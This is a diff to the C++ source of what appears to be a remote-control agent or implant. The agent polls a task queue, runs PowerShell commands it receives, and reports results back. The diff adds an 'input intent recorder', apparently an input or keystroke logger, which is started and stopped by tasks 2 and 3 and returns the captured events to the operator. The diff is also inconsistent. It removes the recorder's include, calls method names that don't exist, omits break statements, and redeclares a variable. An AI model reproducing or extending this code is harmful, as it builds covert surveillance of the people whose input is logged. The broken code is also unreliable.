@@ -1,6 +1,5 @@
 ﻿//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { START OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
 #include "Agent.h"
-#include "InputIntentRecorder.h"
 #include "CommManager.h"
 #include "CheckinModels.h"
 #include "TaskQueueManager.h"
@@ -11,6 +10,11 @@ void Agent::Exit()
 {
     // Exit agent process
     ExitProcess(0);
+}
+
+InputIntentRecorder &Agent::GetInputIntentRecorder()
+{
+    return recorder_;
 }
 
 std::string Agent::GetUID()
@@ -61,6 +65,18 @@ std::string Agent::ExecutePowerShell(const std::string &command)
     (void)command; // Suppress unused parameter warning
     return "PowerShell execution is only supported on Windows.";
 #endif
+}
+
+void Agent::StartInputRecording()
+{
+    recorder_.start();
+}
+
+std::string Agent::StopInputRecording()
+{
+    recorder_.stop();
+
+    return recorder_.events();
 }
 
 void Agent::Init()
@@ -123,6 +139,11 @@ int main(int argc, char *argv[])
                 std::string result = agent.ExecutePowerShell(task.powerShellCommand.commandlet);
                 taskManager.StoreTaskResult(task.id, true, result);
                 break;
+            case 2:
+                agent.StartInputIntentRecorder();
+            case 3:
+                std::string result = agent.StopInputIntentRecorder();
+                taskManager.StoreTaskResult(task.id, true, result);
             }
         }
         Sleep(5000);
